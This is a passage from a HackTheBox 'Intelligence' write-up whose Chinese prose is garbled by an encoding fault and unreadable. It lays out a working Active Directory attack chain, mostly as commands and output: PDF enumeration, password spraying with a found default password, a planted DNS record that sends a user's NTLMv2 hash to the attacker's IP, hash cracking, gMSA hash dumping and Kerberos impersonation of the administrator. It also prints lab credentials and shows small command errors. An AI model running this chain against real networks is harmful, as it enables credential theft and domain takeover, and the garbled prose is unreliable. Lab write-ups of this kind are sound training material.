Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb\n| Not valid before: 2021-04-19T00:43:16\n|_Not valid after:  2022-04-19T00:43:16\n|_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb\n| Not valid before: 2021-04-19T00:43:16\n|_Not valid after:  2022-04-19T00:43:16\n|_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.intelligence.htb\n| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb\n| Not valid before: 2021-04-19T00:43:16\n|_Not valid after:  2022-04-19T00:43:16\n|_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49666/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49678/tcp open  msrpc         Microsoft Windows RPC\n49688/tcp open  msrpc         Microsoft Windows RPC\n49700/tcp open  msrpc         Microsoft Windows RPC\n58859/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 7h12m22s, deviation: 0s, median: 7h12m22s\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2021-07-07T08:50:31\n|_  start_date: N/A\n\nTRACEROUTE (using port 139/tcp)\nHOP RTT       ADDRESS\n1   241.20 ms 10.10.14.1\n2   241.20 ms 10.10.10.248\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 648.79 seconds\n```\nåœ¨ä¸Šé¢æˆ‘ä»¬å¾—åˆ°çš„é‡è¦ä¿¡æ¯æœ‰ï¼š\n\n- å¼€å¯80ç«¯å£çš„HTTPæœåŠ¡\n- å¼€å¯SMBæœåŠ¡ \n- æœ‰ä¸¤ä¸ªåŸŸå`intelligence.htb`å’Œ`dc.intelligence.htb` \n- æœ‰`Kerberos`å¯èƒ½æ¶‰åŠå†…ç½‘æ¸—é€\n\nå’±ä»¬ä¸€ä¸ªä¸€ä¸ªæ¥çœ‹ï¼Œé¦–å…ˆå…ˆæŠŠåŸŸåæ·»åŠ åˆ°hostsé‡Œ\n\n```Plain Text\necho 10.10.10.248 dc.intelligence.htb intelligence.htb > /etc/hosts\n```\nç„¶åå’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªåŸŸå\n\nè¿™ä¸¤ä¸ªåŸŸåçš„å†…å®¹ä¼¼ä¹æ˜¯ä¸€æ ·çš„ï¼Œæ‰¾åˆ°äº†ä¸¤ä¸ªPDFæ–‡ä»¶\n\n```Plain Text\nhttp://intelligence.htb/documents/2020-12-15-upload.pdf\nhttp://intelligence.htb/documents/2020-01-01-upload.pdf\n```\nç¿»è¯‘åæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ¯•ç«Ÿæ˜¯PDFæ–‡ä»¶ï¼Œå’±ä»¬ä½¿ç”¨`exiftool`è¿›è¡ŒæŸ¥çœ‹\n\n```Plain Text\nexiftool 2020-01-01-upload.pdf\n```\n![](Hackthebox-Intelligence/0b06ca38-286b-4cce-b25e-2e71021ff83d.png)\n\n```Plain Text\nexiftool 2020-12-15-upload.pdf\n```\n![](Hackthebox-Intelligence/557cee9f-1385-41ab-96de-a13577a24dfc.png)\n\nåœ¨PDFæ–‡ä»¶ä¸­è¯»å–åˆ°äº†ä¸€ä¸ªåä¸º`Creator`çš„å­—æ®µï¼Œè¿™ä¸ªä¸€èˆ¬ä¸æ˜¯æ­£å¸¸æƒ…å†µï¼Œå…ˆè®°å½•ä¸€ä¸‹å§ã€‚\n\n```Plain Text\nWilliam.Lee\nJose.Williams\n```\nè¿™ä¸ªå¯èƒ½æ˜¯ä¸¤ä¸ªç”¨æˆ·å\n\næˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹è¿™ä¸¤ä¸ªpdfæ–‡ä»¶çš„å‘½åè§„åˆ™ï¼Œä¼šå‘ç°ï¼Œå˜åŠ¨çš„åªæœ‰æ—¥æœŸã€‚é‚£ä¹ˆï¼Œæ˜¯å¦è¿˜æœ‰å…¶ä»–çš„pdfæ–‡ä»¶å‘¢ï¼Ÿè®©æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹\n\n![](Hackthebox-Intelligence/ee74b2f4-0616-465e-8113-87e5240183cf.png)\n\nå¯ä»¥çœ‹åˆ°ï¼Œç¡®å®æ˜¯å­˜åœ¨çš„ã€‚\n\nç„¶åï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªè„šæœ¬ï¼Œæ„Ÿè°¢`kavigihan`å¸ˆå‚…å†™çš„è„šæœ¬\n\n```Plain Text\n#!/usr/bin/python3\n# Author: kavigihan\n\nimport requests\nimport os\n\ndef fuzz_PDFs():\n    with open('days', 'r') as d:\n        days = d.readlines()\n\n    with open('months' ,'r') as m:\n        months = m.readlines()\n\n    url_file = open('urls', 'w')\n    url_file.close()\n\n    for month in months:\n        for day in days:\n            r = requests.get(f'http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf')\n            if int(r.status_code) == 200:\n                print(f'http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf')\n\n                with open('urls', 'a') as url_file:\n                    url_file.write(f'http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf')\n                    url_file.write('\\n')\n\ndef get_PDFs():\n    with open('urls', 'r') as u:\n        urls = u.readlines()\n\n    for url in urls:\n        os.system(f\"wget -q {url.strip()} \")\n        print(f'[+] Downloading -- {url.strip()} ')\n\nfuzz_PDFs()\nget_PDFs()\n```\nä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åç”Ÿæˆä¸¤ä¸ªå­—å…¸\n\n```Plain Text\nseq 1 31 > days; seq 1 12 > months\n```\nè®°å¾—æ‰‹åŠ¨åœ¨ç”Ÿæˆå‡ºæ¥çš„å­—å…¸å†…ï¼ŒæŠŠ1-9æ·»åŠ ä¸Š0ï¼Œæ¯”å¦‚1æœˆå°±æ”¹ä¸º01æœˆ\n\nç„¶åæ‰§è¡Œè¯¥è„šæœ¬\n\n```Plain Text\npython3 exploit.py\n```\nä½¿ç”¨å‘½ä»¤\n\n```Plain Text\ncat *.pdf|strings |grep Creator|cut -d '(' -f 2|cut -d ')' -f 1|grep -v TeX > users;cat users\n```\nææƒpdfæ–‡ä»¶å†…çš„ç”¨æˆ·å\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cat *.pdf|strings |grep Creator|cut -d '(' -f 2|cut -d ')' -f 1|grep -v TeX > users;cat users\nWilliam.Lee\nScott.Scott\nJason.Wright\nVeronica.Patel\nJose.Williams\nBrian.Morris\nJennifer.Thomas\nThomas.Valenzuela\nDavid.Mcbride\nJose.Williams\nAnita.Roberts\nBrian.Baker\nJose.Williams\nDavid.Mcbride\nDavid.Reed\nKaitlyn.Zimmerman\nJason.Patterson\nThomas.Valenzuela\nDavid.Mcbride\nDarryl.Harris\nDavid.Wilson\nScott.Scott\nTeresa.Williamson\nJohn.Coleman\nSamuel.Richardson\nIan.Duncan\nJason.Wright\nTravis.Evans\nDavid.Mcbride\nJessica.Moody\nIan.Duncan\nAnita.Roberts\nKaitlyn.Zimmerman\nJose.Williams\nStephanie.Young\nSamuel.Richardson\nTiffany.Molina\nIan.Duncan\n```\næ¥ç€åœ¨æ–‡ä»¶`2020-06-04-upload.pdf`ä¸­å‘ç°äº†ä¸€ä¸ªé»˜è®¤å¯†ç \n\n```Plain Text\nNew Account Guide\nWelcome to Intelligence Corp!\nPlease login using your username and the default password of:\nNewIntelligenceCorpUser9876\nAfter logging in please change your password as soon as possible.\n```\nä½¿ç”¨exiftoolæŸ¥çœ‹è¯¥pdfï¼Œè·å¾—äº†ç”¨æˆ·å`Jason.Patterson`ï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰äº†ä¸€ä¸ªè´¦æˆ·å¯†ç \n\n```Plain Text\nusername = Jason.Patterson\npassword = NewIntelligenceCorpUser9876\n```\nå’±ä»¬ç›´æ¥ä½¿ç”¨smbè¿›è¡Œç™»å½•\n\n```Plain Text\nsmbclient -L //10.10.10.248 -U Tiffany.Molina\n```\nä½†å½“æˆ‘å°è¯•ç™»å½•çš„æ—¶å€™ï¼Œå´æç¤ºæˆ‘å¤±è´¥äº†ã€‚ä¼°è®¡æ˜¯è´¦æˆ·å¯†ç ä¸åŒ¹é…ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½çˆ†ç ´ä¸€æ³¢äº†\n\n```Plain Text\nä½¿ç”¨crackmapexecè¿›è¡Œçˆ†ç ´\ncrackmapexec smb 10.10.10.248 -u users -p â€œNewIntelligenceCorpUser9876â€\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876\n[*] Initializing LDAP protocol database\n[*] Generating SSL certificate\nSMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876\n```\næˆåŠŸè·å¾—æ­£ç¡®çš„smbè´¦å·å’Œå¯†ç \n\n```Plain Text\nusername = Tiffany.Molina\npassword = NewIntelligenceCorpUser9876\n```\nç™»å½•smbè¿›è¡ŒæŸ¥çœ‹\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# smbclient -L //10.10.10.248 -U Tiffany.Molina\nEnter WORKGROUP\\Tiffany.Molina's password:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        IT              Disk\n        NETLOGON        Disk      Logon server share\n        SYSVOL          Disk      Logon server share\n        Users           Disk\nSMB1 disabled -- no workgroup available\n```\nç™»å½•æˆåŠŸï¼Œå’±ä»¬æŸ¥æ‰¾ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„æ–‡ä»¶å§\n\nå¯ä»¥æŸ¥çœ‹çš„å°±`IT`å’Œ`Users`ç›®å½•ï¼Œå’±ä»¬åˆ†åˆ«å»æŸ¥çœ‹ä¸€ä¸‹\n\n```Plain Text\nsmbclient //10.10.10.248/IT -U Tiffany.Molina\nsmbclient //10.10.10.248/Users -U Tiffany.Molina\n```\nåœ¨ITç›®å½•ä¸‹æ‰¾åˆ°äº†ä¸€ä¸ªps1çš„æ–‡ä»¶\n\n```Plain Text\nâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# smbclient //10.10.10.248/IT -U Tiffany.Molina                                                                                                                                                           130 â¨¯\nEnter WORKGROUP\\Tiffany.Molina's password:\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Mon Apr 19 08:50:55 2021\n  ..                                  D        0  Mon Apr 19 08:50:55 2021\n  downdetector.ps1                    A     1046  Mon Apr 19 08:50:55 2021\n\n                3770367 blocks of size 4096. 1330536 blocks available\nsmb: \\> get downdetector.ps1\ngetting file \\downdetector.ps1 of size 1046 as downdetector.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)\n```\nå…ˆä¸‹è½½ä¸‹æ¥ï¼Œå’±ä»¬å»çœ‹çœ‹usersç›®å½•\n\nåœ¨`Users\\Tiffany.Molina\\Desktop`ä¸‹æ‰¾åˆ°äº†user.txtæ–‡ä»¶\n\n```Plain Text\nsmb: \\Tiffany.Molina\\Desktop\\> get user.txt\ngetting file \\Tiffany.Molina\\Desktop\\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cat user.txt                                                                                                                                                                                              1 âš™\n6d148717e36be40a48439bdf34ea3054\n```\næˆåŠŸè·å¾—useræƒé™çš„flagæ–‡ä»¶\n\n## æ¼æ´åˆ©ç”¨\næŸ¥çœ‹ä¸€ä¸‹`downdetector.ps1`æ–‡ä»¶çš„å†…å®¹\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cat downdetector.ps1                                                                                                                                                                                      1 âš™\nï¿½ï¿½# Check web server status. Scheduled to run every 5min\nImport-Module ActiveDirectory\nforeach($record in Get-ChildItem \"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\" | Where-Object Name -like \"web*\")  {\ntry {\n$request = Invoke-WebRequest -Uri \"http://$($record.Name)\" -UseDefaultCredentials\nif(.StatusCode -ne 200) {\nSend-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject \"Host: $($record.Name) is down\"\n}\n} catch {}\n}\n```\næˆ‘ä»¬è§£è¯»ä¸€ä¸‹è¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œæ¯äº”åˆ†é’Ÿï¼Œå®ƒä¼šæ£€æŸ¥ä»¥â€œwebâ€å¼€å¤´çš„åŸŸ`intelligence.htb`çš„ä»»ä½•DNSè®°å½•ï¼Œå¹¶ä½¿ç”¨`Ted`çš„å‡­æ®ä¸ºæ¯ä¸ªæ‰¾åˆ°çš„åŸŸå‘é€HTTPè¯·æ±‚ã€‚(ä½¿ç”¨`-UseDefaultCredentials`é€‰é¡¹)å¦‚æœæœåŠ¡å™¨æ²¡æœ‰è¿”å›200 OKçŠ¶æ€ç ï¼Œåˆ™ä¼šå‘`Ted`å‘é€ä¸€å°é‚®ä»¶ã€‚\n\næˆ‘ä»¬è¦åšçš„æ˜¯ä½¿ç”¨`dnstool.py`æ·»åŠ ä¸€ä¸ªä»webå¼€å§‹ä¸å­˜åœ¨çš„å‡VHOSTåˆ°zoneã€‚è¿™æ ·å°±ä¼šè§¦å‘è„šæœ¬å‘`Ted`å‘é€é‚®ä»¶ã€‚ > https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py\n\n```Plain Text\npython3 dnstool.py -u 'intelligence.htb\\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'weboops.intelligence.htb' -d 10.10.14.40 10.10.10.248\n10.10.14.40 æ˜¯æˆ‘ä»¬æœ¬åœ°çš„IP\n10.10.10.248 æ˜¯é¶æœºçš„IP\n```\nè¯¥è„šæœ¬ä¼šå‘æˆ‘ä»¬å‘é€ç”µå­é‚®ä»¶ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨`responder`æ¥è¿›è¡Œå—…æ¢å¹¶æ•è·`Ted`ç”¨æˆ·çš„å¯†ç Hashå€¼\n\n```Plain Text\nresponder -I tun0 -A\n```\næ‰§è¡Œåï¼Œç”±äºè¯¥è„šæœ¬æ¯äº”åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡ï¼Œæ‰€ä»¥å’±ä»¬éœ€è¦ç­‰ç­‰\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# responder -I tun0 -A\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.0.2.0\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    DNS/MDNS                   [ON]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    RDP server                 [ON]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [ON]\n    Force WPAD auth            [OFF]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Fingerprint hosts          [OFF]\n\n[+] Generic Options:\n    Responder NIC              [tun0]\n    Responder IP               [10.10.14.40]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP']\n\n[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.14.40) is not on the same subnet than the DNS server (192.168.72.2).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[+] Listening for events...\n[HTTP] NTLMv2 Client   : 10.10.10.248\n[HTTP] NTLMv2 Username : intelligence\\Ted.Graves\n[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:0daa3ec1b284a949:CD76623716C3609875D86DDA36EB0EDF:0101000000000000A604499B3D73D7015C5EEEC5D556C5D8000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000200000035C7091E068F4D7CCC464ABE730F3C960A0B592A633A716B97E3209EF5BD0D30A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000\n```\næˆåŠŸæ•è·hashï¼Œå’±ä»¬ä¿å­˜åˆ°æœ¬åœ°\n\nå’±ä»¬è¿™é‡Œä½¿ç”¨johnè¿›è¡Œhashçˆ†ç ´ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å·¥å…·ï¼Œæ¯”å¦‚hashcat\n\n```Plain Text\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n```\nçˆ†ç ´å®Œä»¥åæŸ¥çœ‹hash.txt\n\n```Plain Text\njohb --show hash.txt\n```\næˆåŠŸè·å¾—è´¦å·å¯†ç \n\n```Plain Text\nusername = Ted.Graves\npassword = Mr.Teddy\n```\næˆ‘ä»¬æˆåŠŸæ‹¿åˆ°äº†Tedçš„è´¦æˆ·å¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•å°†ç”¨æˆ·å…±äº«æŒ‚è½½ä¸ºTedå¹¶æšä¸¾\n\n```Plain Text\nmkdir mount ;sudo mount //10.10.10.248/Users mount/ -o username=â€Ted.Gravesâ€,password=â€Mr.Teddyâ€\n```\nå¯æƒœçš„æ˜¯ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œè‹¦äºæ²¡æœ‰æ€è·¯ï¼Œæˆ‘åˆå»æ£€æŸ¥äº†ä¸€éä¹‹å‰æ‰¾åˆ°çš„æ–‡ä»¶ï¼Œåœ¨`2020-12-30-upload.pdf`ä¸­ï¼Œè¿˜çœŸå‘ç°äº†ç‚¹ä¸œè¥¿\n\n```Plain Text\nInternal IT Update\n\nThere has recently been some outages on our web servers. Ted has gotten ascript in place to help notify us if this happens again.Also, after discussion following our recent security audit we are in the processof locking down our service accounts.\n```\nå¤§è‡´æ„æ€å°±æ˜¯è¯´ä»–ä»¬è¿˜æ²¡æœ‰é”å®šæœåŠ¡è´¦æˆ·ã€‚é€šè¿‡GoogleæŸ¥æ‰¾åå‘ç°ï¼Œå¦‚æœå¯ç”¨äº†æœåŠ¡è´¦æˆ·ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨`gMASDumper.py`è½¬å‚¨Hashå€¼ã€‚\n\n## æƒé™æå‡\n> https://github.com/micahvandeusen/gMSADumper\n\nå’±ä»¬ä½¿ç”¨è¿™ä¸ªè„šæœ¬ä¸ºTedè·å–ä¸€ä¸ªNTHash\n\n```Plain Text\npython3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/gMSADumper]\nâ””â”€# python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb\nsvc_int$:::d64b83fe606e6d3005e20ce0ee932fe2\n```\næœ‰äº†è¿™ä¸ªä¹‹åï¼Œå’±ä»¬å¯ä»¥åšPTTï¼ˆPass The Ticketï¼‰æ”»å‡»ã€‚\n\nå’±ä»¬ä½¿ç”¨ntpdateè¿›è¡Œåˆ©ç”¨\n\n```Plain Text\nntpdate 10.10.10.248\n```\nå¦‚æœè¿è¡Œåæ—¶é—´æ²¡æœ‰æ›´æ”¹ï¼Œä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è§£å†³\n\n```Plain Text\napt-get install chrony\ntimedatectl set-ntp true\nntpdate 10.10.10.248\n```\nä½¿ç”¨pythonè‡ªå¸¦çš„getST.pyä»¥ç®¡ç†å‘˜èº«ä»½è·å–ç¥¨æ®ï¼Œä»¥ä¾¿äºæˆ‘ä»¬ä»¥ç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤\n\n```Plain Text\npython3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/gMSADumper]\nâ””â”€# python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator                   127 â¨¯\nImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation\n\n[*] Getting TGT for user\n[*] Impersonating administrator\n[*]     Requesting S4U2self\n[*]     Requesting S4U2Proxy\n[*] Saving ticket in administrator.ccache\n```\nç¥¨æ®å·²ä¿å­˜ä¸º`administrator.ccache`ï¼Œæœ‰äº†è¿™ä¸ªç¥¨æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å„ç§å·¥å…·è¿›è¡Œåˆ©ç”¨äº† ä½¿ç”¨`export`æ¥å°†ç¥¨æ®ä½œä¸ºç¯å¢ƒå˜é‡\n\n```Plain Text\nexport KRB5CCNAME=administrator.ccache\n```\nè¿™é‡Œæˆ‘ä»¬ç»§ç»­ä½¿ç”¨pythonçš„å·¥å…·`smbclient.py`è¿›è¡Œåˆ©ç”¨\n\n```Plain Text\npython3 /usr/share/doc/python3-impacket/examples/smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass\n```\nè¿›å…¥åï¼Œæˆ‘ä»¬å°±æˆåŠŸä½¿ç”¨smbclient.pyç™»å½•åˆ°smbé‡Œäº†\n\nè¿›å…¥åï¼Œå’±ä»¬è·å–rootæƒé™çš„flagæ–‡ä»¶å³å¯\n\n```Plain Text\nshares\nuse Users\nls\ncd Administrator\ncd Desktop\nget root.txt\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cat 